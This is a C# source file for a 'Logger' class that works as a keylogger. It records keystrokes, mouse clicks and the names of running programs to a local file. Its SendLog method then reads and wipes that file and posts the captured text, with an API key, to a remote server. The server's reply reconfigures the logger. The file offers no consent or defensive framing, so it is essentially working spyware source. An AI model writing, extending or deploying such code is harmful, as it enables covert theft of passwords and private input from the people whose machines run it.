using System.Diagnostics;
using System.Net;
using System.Net.Http.Json;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace EventLogger;
// class that handles the logging of events
public class Logger
{
    private String _line;
    private int _eventsLogged; // used to determine when write string on file because the log string is too long
    private DateTime _previousClick = DateTime.Now; // used to determine double-left-click
    private String _processes = ""; // used to determine if a process is running
    private bool _deleting = false;
    private bool _fileTouch = false; // used to determine if the file has been written
    private Constants _config;
    
    public Logger(Constants config)
    {
        if (!File.Exists(Constants.PATH))
        {
            using (StreamWriter sw = File.CreateText(Constants.PATH))
            {
                sw.WriteLine("[INIT]");
            }	
        }
        _line = "";
        _eventsLogged = 0;
        _config = config;
    }

    public void MouseLog(String key)
    {
        
        if (_config.LOG_PROCESS_ON_DOUBLE_CLICK && key=="[ML]")
        {
            if (DateTime.Now.Subtract(_previousClick).TotalMilliseconds <= 500)
            {
                key = "[DML]";
                if (_config.LOG_PROCESS_ON_DOUBLE_CLICK)
                {
                    ProcessLog(false);
                }
            }
            _previousClick = DateTime.Now;
        }

        if (!_config.LOG_MOUSE_EVENTS) return;
        _line += key;
    }
    
    public void KeyLog(String key)
    {
        if (!_config.LOG_KEYBOARD_EVENTS) return;
        _line += key;
        _eventsLogged++;
        if (_eventsLogged < _config.MAX_CONT_EVENTS) return;
        Log();
    }

    private void ProcessLog(bool forced)
    {
        // forced to log the process even if there is no change
        Process[] processes = Process.GetProcesses();
        String newProcesses = String.Join(",",processes
            .Where(p => p.MainWindowTitle.Length > 0)
            .Select(p => p.ProcessName)
            .Distinct()
            .Except(Constants.BANNED_PROCESS)
            .OrderBy(p=>p));
        if (forced || _processes!=newProcesses)
        {
            // if the process has changed, log it
            _line += "<"+DateTime.Now+","+newProcesses+">";
            _eventsLogged++;
        }
        _processes = newProcesses;
    }
    
    private void Log()
    {
        // method that logs the current line asd as sda a sda sd
        if(_deleting) return;
        using (StreamWriter w = File.AppendText(Constants.PATH))
        {
            w.WriteLine(_line);
        }
        _line = "";
        _eventsLogged = 0;
        _fileTouch = true;
    }

    public void SendLog()
    {
        String body = "";
        if (_fileTouch)
        {
            // load body from file and delete it
            _deleting = true;
            using (StreamReader w = File.OpenText(Constants.PATH))
            {
                String line = w.ReadLine();
                while ( line!= null)
                {
                    body += line;
                    line = w.ReadLine();
                }
            }
            File.WriteAllText(Constants.PATH,string.Empty);
            _fileTouch = false;
            _deleting = false;
        }
        ProcessLog(true); // update actual processes
        body = DateTime.Now +" | "+ body + _line;
        HttpResponseMessage response = null;
        try
        {
            using (var client = new HttpClient())
            {
                var rBody = "{\"content\":\"" + body + "\",\"key\":\"" + Constants.API_KEY + "\"}";
                //Console.WriteLine(rBody);
                response = client.PostAsync(
                    Constants.API_URL,
                    new StringContent(rBody,
                        Encoding.UTF8,
                        "application/json")).Result;
                if (response.IsSuccessStatusCode)
                {
                    _line = "";
                    // read request body
                    var r = response.Content.ReadAsStringAsync().Result;
                    _config.UpdateConfig(r);
                    return;
                }
                throw new Exception("Error sending log to server");
            }
        }
        catch (Exception ex)
        {
            //Console.WriteLine(ex.Message);
            _line = body; //keeping log file
        }
    }
    
}